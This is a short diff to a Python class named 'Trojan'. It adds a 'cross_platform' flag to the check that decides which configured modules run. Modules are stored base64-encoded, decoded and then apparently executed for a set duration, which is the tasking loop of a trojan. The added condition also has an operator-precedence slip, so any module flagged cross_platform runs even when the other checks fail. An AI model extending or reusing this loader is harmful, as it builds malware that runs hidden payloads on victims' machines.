@@ -52,8 +52,9 @@ class Trojan():
                         duration = module.get("duration", 0)
                         module_OS = module.get("OS_type")
                         encoded_module = module.get("path") 
+                        cross_platform = module.get("cross_platform")
                             
-                        if module_name and duration > 0 and encoded_module and module_activation and module_OS == my_os:
+                        if module_name and duration > 0 and encoded_module and module_activation and module_OS == my_os or cross_platform:
                             print(f"Executing module '{module_name}' for {duration} seconds...")
                             decoded_module = self.base64_to_text(encoded_module)
                                 
